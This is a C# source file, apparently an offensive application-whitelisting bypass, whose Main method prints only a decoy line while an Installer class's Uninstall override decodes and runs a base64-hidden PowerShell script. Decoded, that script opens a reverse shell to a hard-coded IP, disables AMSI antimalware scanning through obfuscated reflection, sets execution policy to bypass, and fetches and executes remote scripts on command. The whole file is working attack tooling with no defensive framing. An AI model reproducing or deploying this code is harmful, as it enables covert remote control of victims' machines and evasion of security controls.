using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Text;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is, like, the primary like functionality, dude.");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "JGNsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCcxOTIuMTY4LjQ5LjUyJyw4MCkKJHVwbG9hZHMgPSAnaHR0cDovLzE5Mi4xNjguNDkuNTI6NDQzLycKJHN0cmVhbXJlYWRlciA9ICRjbGllbnQuR2V0U3RyZWFtKCkKJHN0cmVhbXdyaXRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVdyaXRlcigkc3RyZWFtcmVhZGVyKQoKZnVuY3Rpb24gV3JpdGVTdHJlYW0gKCRTdHJpbmcpIHsKICBbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJGNsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9CiAgJHdkID0gcHdkCiAgJHVzZXIgPSB3aG9hbWkKICAkc3RyZWFtd3JpdGVyLldyaXRlKCRTdHJpbmcgKyAnWycgKyAkdXNlciArICcgJyArICR3ZCArICddJyArICckICcgKQogICRzdHJlYW13cml0ZXIuRmx1c2goKQp9CgpmdW5jdGlvbiBJbXBvcnQoJGZpbGVuYW1lKSB7CiAgcmV0dXJuIChbU3lzdGVtLk5ldC5XZWJDbGllbnRdOjpuZXcoKS5Eb3dubG9hZFN0cmluZygkdXBsb2FkcyArICRmaWxlbmFtZSkpICAKICB9CgpmdW5jdGlvbiBVcGxvYWQoJGZpbGVuYW1lLCAkZmlsZXBhdGgpIHsKICAkZG93bmZpbGUgPSAkdXBsb2FkcyArICRmaWxlbmFtZQogIGludm9rZS13ZWJyZXF1ZXN0ICRkb3duZmlsZSAtdXNlYmFzaWNwYXJzaW5nIC1vdXRmaWxlICRmaWxlcGF0aCAKCn0KCiRhc20gPSBbUmVmXS5hU1NlbUJMeS5nRVR0eXBFcygpCiRtYXRjaDEgPSAnYU0qbCpzJwokbWF0Y2gyID0gJyphSUxlRConCiRmaWVsZDEgPSAnbk9uUHVCbEljJwokZmllbGQyID0gJ3NUYVRpQycKJG4gPSAkTlVMTAokdCA9ICRUUlVFCigkYXNtIHwgJSB7aWYgKCRfLk5hbWUgLWxpa2UgJG1hdGNoMSkgeyRfLkdldEZpZWxkcygkZmllbGQxKycsJyskZmllbGQyKSB8ID8geyRfLk5hbWUgLWxpa2UgJyphaWwqZConfX19KS5TZXRWYWx1ZSgkbiwgJHQpCgpzZXQtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAtc2NvcGUgY3VycmVudHVzZXIKCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKCldyaXRlU3RyZWFtICcnCgp3aGlsZSgoJEJ5dGVzUmVhZCA9ICRzdHJlYW1yZWFkZXIuUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCkpIC1ndCAwKSB7CiAgJGNvbW1hbmQgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJEJ5dGVzUmVhZCAtIDEpCiAgCiAgJHN1YmNvbW1hbmRzID0gJGNvbW1hbmQuc3BsaXQoIiAiLFtTeXN0ZW0uU3RyaW5nU3BsaXRPcHRpb25zXTo6UmVtb3ZlRW1wdHlFbnRyaWVzKQogIHN3aXRjaCAoJHN1YmNvbW1hbmRzWzBdKSB7CiAgICAnaW1wb3J0JyB7ICRzY3JpcHQgPSBJbXBvcnQgJHN1YmNvbW1hbmRzWzFdOyBpZXggJHNjcmlwdDsgJG91dHB1dCA9ICdJbXBvcnRlZCAnICsgJHN1YmNvbW1hbmRzWzFdICsgImBuIjsgYnJlYWsgfQogICAgJ3VwbG9hZCcgeyB1cGxvYWQgJHN1YmNvbW1hbmRzWzFdICRzdWJjb21tYW5kc1syXTsgJG91dHB1dCA9ICdVcGxvYWRlZCAnICsgJHN1YmNvbW1hbmRzWzFdICsgJ3RvICcgKyAkc3ViY29tbWFuZHNbMl07IGJyZWFrfQogICAgZGVmYXVsdCB7ICRvdXRwdXQgPSB0cnkgeyBpZXggJGNvbW1hbmQgMj4mMSB8IG91dC1zdHJpbmcgfSBjYXRjaCB7ICRfIHwgb3V0LXN0cmluZyB9fQogIH0KCiAgV3JpdGVTdHJlYW0gKCRPdXRwdXQpCgp9CiRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQo=";

            byte[] cmdBytes = Convert.FromBase64String(cmd);
            string decodedCmd = Encoding.UTF8.GetString(cmdBytes);

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(decodedCmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
